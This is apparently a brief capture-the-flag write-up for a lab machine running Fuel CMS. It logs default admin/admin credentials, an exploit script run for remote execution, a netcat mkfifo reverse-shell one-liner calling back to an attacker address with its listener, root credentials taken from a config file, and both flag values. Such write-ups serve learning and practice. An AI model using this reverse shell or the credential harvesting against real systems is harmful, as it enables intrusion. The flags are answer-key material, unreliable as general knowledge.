# 10.10.209.147



port 80 is open

robots.txt: _/fuel/


login to admin using admin/admin user and pass (this was provided on the landing page)


ran ./50477.py script (remote execution)


On target:
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.47.37 9999 >/tmp/f


On my machine: 
nc -lvnp 9999 




found the first flag (user): 6470e394cbf6dab6a91682cc8585059b


the creds of root user can be found in fuel/application/config/database.php 


username: root
password: mememe

do: su -


root.txt:
b9bbcb33e11b80be759c4e844862482d